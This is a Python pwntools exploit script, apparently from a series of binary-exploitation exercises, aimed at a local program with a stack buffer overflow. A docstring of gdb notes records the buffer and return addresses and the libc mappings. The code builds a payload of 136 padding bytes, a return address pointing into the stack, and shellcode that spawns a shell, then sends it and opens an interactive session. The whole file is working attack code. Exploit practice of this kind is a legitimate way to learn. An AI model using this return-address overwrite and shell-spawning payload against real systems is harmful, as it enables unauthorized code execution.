#!/usr/bin/python

"""
(gdb) bt
#0  0x00007ffff7af4081 in __GI___libc_read (fd=0, buf=0x7fffffffdd80, nbytes=512) at ../sysdeps/unix/sysv/linux/read.c:27
#1  0x0000000000400643 in vulnerable () at src/04-shellcode-static.c:10
#2  0x0000000000400669 in main (argc=1, argv=0x7fffffffdf08) at src/04-shellcode-static.c:17
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x0000000000400607 <+0>:	push   rbp
...
   0x000000000040064f <+72>:	ret    
End of assembler dump.
(gdb) b *0x000000000040064f
Breakpoint 1 at 0x40064f: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, 0x000000000040064f in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p &buffer[0]
$1 = 0x7fffffffdd80 'a' <repeats 128 times>, " \336\377\377\377\177"
(gdb) i r $rsp
rsp            0x7fffffffde08	0x7fffffffde08
(gdb) info proc mappings 
process 28617
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
...
"""

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = './bin/x86-64/04-shellcode-static'
libc_path = '/lib/x86_64-linux-gnu/libc-2.27.so'

vulnerable_ret_addr = 0x7fffffffde08
buffer_addr = 0x7fffffffdd80
libc_addr = 0x7ffff79e4000

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#g = gdb.attach(p, 'file ./bin/x86-64/04-shellcode-static')

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p64(vulnerable_ret_addr + 8)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
